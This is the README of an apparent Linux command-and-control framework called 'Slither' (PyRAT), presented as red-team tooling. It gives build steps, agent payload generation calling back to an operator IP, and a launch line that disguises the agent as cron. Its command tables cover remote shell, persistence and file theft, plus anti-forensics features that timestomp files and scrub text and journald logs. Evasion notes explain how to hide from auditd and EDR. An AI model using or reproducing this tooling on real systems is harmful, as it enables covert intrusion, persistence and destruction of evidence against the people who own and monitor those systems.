```
   _____ _ _ _   _               
  / ____| (_) | | |              
 | (___ | |_| |_| |__   ___ _ __ 
  \___ \| | | __| '_ \ / _ \ '__|
  ____) | | | |_| | | |  __/ |   
 |_____/|_|_|\__|_| |_|\___|_|   
                                  
        PyRAT C2 Framework
```

# Slither — PyRAT C2 Framework

A lightweight, stealthy Linux C2 framework written in Python. Compiles to standalone ELF binaries for both the server and agent. Designed for red team operations with evasion in mind — agent built-ins use native Python and raw syscalls to avoid spawning child processes.

---

## Table of Contents

- [Requirements](#requirements)
- [Quick Start](#quick-start)
- [Building](#building)
- [Server Usage](#server-usage)
- [Agent Commands](#agent-commands)
- [Protocols](#protocols)
- [Architecture](#architecture)

---

## Requirements

**Build machine only** (targets need no dependencies):

```
Python 3.10+
Nuitka        → pip install nuitka
patchelf      → apt install patchelf
gcc           → apt install gcc
```

---

## Quick Start

```bash
# 1. Build the server binary
python3 build.py

# 2. Run it
./slither

# 3. Inside slither, start a listener
slither> listen 443 --proto https

# 4. Generate an agent payload
slither> generate 10.10.14.9 443 --proto https

# 5. Compile the agent to a binary
slither> compile payload_XXXX.py

# 6. Transfer agent to target and run
#    On target:
chmod +x cron && PATH=. /bin/bash -c 'exec -a "/usr/sbin/cron" cron -f'
```

---

## Building

### Compile the Server

```bash
python3 build.py                  # Default output: ./slither
python3 build.py -o myc2          # Custom name
```

The build script uses Nuitka `--onefile` and bundles the `agent/` and `shared/` source trees as embedded data, so payload generation works from the binary.

**Distribute:**
```bash
scp slither user@teamserver:/opt/pyrat/
```

### Compile an Agent

From inside the server CLI:
```
slither> generate 10.10.14.9 443 --proto https --interval 5 --jitter 0.3
slither> compile payload_XXXX.py
```

Or manually with Nuitka:
```bash
nuitka --onefile --output-filename=cron payload_XXXX.py
```

---

## Server Usage

### Starting the Server

```bash
./slither                                    # Interactive mode
./slither -l 443 --proto https               # Quick-listen on port 443
./slither -l 8080 --proto http --psk mykey   # HTTP with custom PSK
```

### Main Menu Commands

| Command | Description |
|---------|-------------|
| `listen <port> [--proto http\|https\|mtls]` | Start a listener |
| `listeners` | List active listeners |
| `kill <id>` | Stop a listener |
| `sessions` | List active agent sessions |
| `use <id>` | Interact with a session |
| `generate <host> <port> [options]` | Generate agent payload |
| `compile <file>` | Compile payload to ELF binary |

### Protocols

| Protocol | Flag | Notes |
|----------|------|-------|
| HTTP | `--proto http` | Plaintext, for labs/testing |
| HTTPS | `--proto https` | Auto-generates self-signed cert |
| mTLS | `--proto mtls` | Mutual TLS with client certs |

---

## Agent Commands

Once you `use <session_id>`, you get the agent menu. All commands below run **natively** using Python/syscalls — no child processes are spawned (invisible to process-based EDR).

### Recon

| Command | Description |
|---------|-------------|
| `ls [path]` | Directory listing via `getdents64` syscall |
| `ps` | Process list via `/proc` parsing |
| `netstat` | Network connections via `/proc/net/tcp` |
| `whoami` | UID/GID via syscalls |
| `sysinfo` | Full system enumeration |
| `env` | Dump environment variables |
| `cat <file>` | Read file via `read` syscall |
| `tail <file> [n]` | Last N lines of a file (default 10) |
| `find <path> <pattern>` | Recursive file search (glob patterns) |
| `portscan <host> [ports]` | TCP connect port scanner |
| `volsearch` | Interactive disk usage + recent file search |

### File Operations

| Command | Description |
|---------|-------------|
| `upload <local> <remote>` | Upload file to agent |
| `download <remote> [local]` | Download file from agent |
| `cp <src> <dst>` | Copy file (raw syscalls) |
| `mv <src> <dst>` | Move/rename file |
| `rm <file>` | Delete file via `unlink` syscall |

### Actions

| Command | Description |
|---------|-------------|
| `shell <cmd>` | Execute shell command (30s timeout) |
| `shell` | Drop into pseudo-interactive `sh>` loop |
| `persist [cron\|systemd\|bashrc]` | Install persistence |
| `cgroup [info\|list\|migrate]` | Cgroup operations |

### Anti-Forensics

| Command | Description |
|---------|-------------|
| `timestomp <src> <target>` | Copy atime/mtime from src to target |
| `shred <file> [passes]` | Secure delete (overwrite + remove) |
| `logclean <file> <regex>` | Remove matching lines from text logs |
| `cleanjournal <file> <regex>` | Null out regex matches in binary logs (preserves inode) |

### Session Control

| Command | Description |
|---------|-------------|
| `interactive` | Set sleep to 0 for real-time mode |
| `sleep <seconds>` | Change beacon interval |
| `jitter <float>` | Change jitter (0.0–1.0) |
| `info` | Show session details |
| `die` | Self-destruct agent (unlink binary + exit) |
| `back` | Return to main menu |

---

## Architecture

```
pyrat/
├── build.py              # Server compilation script
├── slither               # Launcher script (dev mode)
│
├── server/
│   ├── main.py           # Server entry point
│   ├── cli.py            # Interactive CLI (cmd module)
│   ├── listener.py       # HTTP/HTTPS/mTLS listener management
│   ├── handler.py        # Agent HTTP request handler
│   ├── session.py        # Session tracking
│   ├── transport.py      # Server-side transport layer
│   ├── payloads.py       # Payload generation + compilation
│   └── pki.py            # Certificate generation for HTTPS/mTLS
│
├── agent/
│   ├── main.py           # Agent entry point + command dispatch
│   ├── config.py         # Agent configuration
│   ├── transport.py      # Agent-side HTTP transport
│   ├── syscalls.py       # Raw Linux syscall wrappers (ctypes)
│   └── modules/
│       ├── dir_listing.py    # ls via getdents64
│       ├── proc_enum.py      # ps via /proc
│       ├── net_info.py       # netstat via /proc/net
│       ├── file_ops.py       # upload/download/cat/cp/mv/rm
│       ├── shell.py          # Shell command execution
│       ├── sysinfo.py        # System info collection
│       ├── env_dump.py       # Environment variables
│       ├── portscan.py       # TCP connect scanner
│       ├── cgroup_mgr.py     # Cgroup enumeration + migration
│       ├── persist.py        # Persistence mechanisms
│       ├── survey.py         # System fingerprinting
│       ├── cleanlog.py       # Text log cleaning
│       ├── clean_journal.py  # Binary log cleaning (journald)
│       ├── tail.py           # File tail
│       ├── timestomp.py      # Timestamp manipulation
│       ├── shred.py          # Secure file deletion
│       ├── find.py           # Recursive file search
│       └── volume_mgr.py     # Disk usage + recent file search
│
└── shared/
    ├── crypto.py         # PSK generation + HMAC
    └── protocol.py       # Message framing + serialization
```

---

## Evasion Notes

- **No child processes**: All agent built-ins use native Python I/O or raw `syscall()` via ctypes. No `execve` events in auditd/sysmon.
- **Process masquerading**: Agent renames itself to match its Nuitka wrapper process name using `prctl(PR_SET_NAME)` + `setproctitle`.
- **Cgroup migration**: Agent can migrate its PID into a legitimate service's cgroup to blend in.
- **Timestomping**: Copy legitimate file timestamps onto dropped files.
- **Log cleaning**: Scrub text logs (line removal) and binary journal files (null byte overwrite, preserving inode/size).

---

## License

Internal use only. Not for distribution.
